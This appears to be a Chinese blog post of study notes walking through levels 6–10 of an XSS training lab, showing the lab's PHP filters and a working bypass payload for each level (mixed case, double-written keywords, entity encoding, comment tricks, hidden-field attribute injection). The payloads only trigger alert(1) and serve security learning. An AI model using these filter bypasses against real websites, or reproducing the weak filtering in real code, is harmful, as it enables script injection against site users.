---
layout: post
title: "XSS_Game-level-6-10" 
subtitle: "XSS_Game-level-6-10"
date: 2019-07-20
author: ppbibo
category: Notes

---



[TOC]

**PS :** 

继续上一次的[xss 学习](https://6o9.im/notes/2019/06/25/XSS_Game-level-1-5.html)，记录笔记。



## Level-6 大小写混用绕过

继续使用第 level-5 关的 **payload** ```"><a href="javascript:alert(1)">点我有惊喜～ ``` 进行测试，回显如下:

```html
<h1 align=center>欢迎来到level6</h1>
<h2 align=center>没有找到和&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;点我有惊喜～相关的结果.</h2><center>
<form action=level6.php method=GET>
<input name=keyword  value=""><a hr_ef="javascript:alert(1)">点我有惊喜～">
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level6.png></center>
<h3 align=center>payload的长度:51</h3><h3 align=center>By:HACK学习</h3>
```

发现将href 替换成了 hr_ef 。

Tips: *HTML 标记语言中标签实际上是对大小写不敏感的*

所以我们使用大小写混用来绕过 **Payload**```"><a hRef="javascript:alert(1)">点我有惊喜~```

![xss_level_6](/static/img/xss_level_6.png)



## Level-7 双写绕过

继续尝试上一关的 **Payload** ```"><a hRef="javascript:alert(1)">点我有惊喜~``` 进行测试，回显如下

```html
<body>
<h1 align=center>欢迎来到level7</h1>
<h2 align=center>没有找到和&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;点我有惊喜~相关的结果.</h2><center>
<form action=level7.php method=GET>
<input name=keyword  value=""><a ="java:alert(1)">点我有惊喜~">
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level7.png></center>
<h3 align=center>payload的长度:38</h3><h3 align=center>By:HACK学习</h3>
</body>
```

发现直接过滤了 `href` 、 `on` 、 `script` 等关键字，

构造**Payload**  ```"><a hrhrefef="javascrscriptipt:alert(1)">点我有惊喜~```

**RT：**

![xss_level_7](/static/img/xss_level_7.png)



## Level-8 Unicode 编码绕过

PHP 源代码如下：

```php
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
```

发现将 ```script``` ```on``` ```src``` ```data``` ```href``` ```"``` 都给加上了 ```_``` 

先随便测试 **Payload** ```javascript:alert(1)``` 回显：

```html
<center><BR><a href="javascr_ipt:alert(1)">友情链接</a></center><center><img src=level8.jpg></center>
```

这个使用uncode 编码来进行绕过 [【参考】](https://6o9.im/security/2019/01/12/XSS-Learning-Notes.html)

**Payload ** ```javascrip&#116;:alert(1)```  或者 ```javascrip&#x74;:alert(1)``` 如图：

![xss_level_8](/static/img/xss_level_8.png)



## Level-9 注释绕过

这一关源代码比上一关多了几行代码如图：

```php
if(false===strpos($str7,'http://'))
{echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';}
else{echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';}
```

也就是说我们的 **Payload** 中一定要包含 ```http://``` 

构造 **Payload**  ```javascrip&#116;:alert(1)/*http://*/```

利用js注释来绕过。**RT：**

![xss_level_9](/static/img/xss_level_9.png)

*Tips:*

```javascript
//     		 # js注释

<!-- -->   # HTML注释

/**/   		 # js注释
```



##Level-10 利用隐藏的表单来进行插入

查看源代码

```php
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
```

发现 ```htmlspecialchars```  函数只对 ```keyword``` 参数进行了校验并有对 ```t_sort```参数进行校验 ，

so 构造 **Payload**  ```?keyword=1&t_sort=1" type="text" onmouseover="alert(1)```

**RT :**

![xss_level_10](/static/img/xss_level_10.png)



## Level-11 

持续更新

time：2019-7-20



[靶机地址](http://xss.tesla-space.com/level10.php)